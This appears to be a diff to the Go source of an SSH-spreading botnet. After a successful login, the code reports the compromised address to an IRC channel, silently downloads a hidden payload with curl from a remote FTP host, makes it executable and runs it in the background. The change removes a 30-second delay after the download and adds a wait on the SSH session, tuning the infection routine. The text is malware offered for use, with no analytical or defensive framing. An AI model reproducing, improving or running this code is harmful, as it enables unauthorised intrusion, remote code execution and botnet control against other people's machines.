@@ -126,6 +126,7 @@ func ssh_session(ssh_session *ssh.Client, command string) {
 	var set_session bytes.Buffer
 	session.Stdout = &set_session
 	session.Run(command)
+	session.Wait()
 	session.Close()
 }
 
@@ -176,7 +177,6 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 						if err == nil {
 							IRC_Report(reportIRC, set_chan, "Login success at "+turnRange)
 							ssh_session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
-							time.Sleep(30 * time.Second) //set curl delay
 							IRC_Report(reportIRC, set_chan, "\"curl\" Success on "+turnRange)
 							ssh_session(_session, "chmod +x ."+set_payload)
 							go ssh_session(_session, "./."+set_payload+" &")
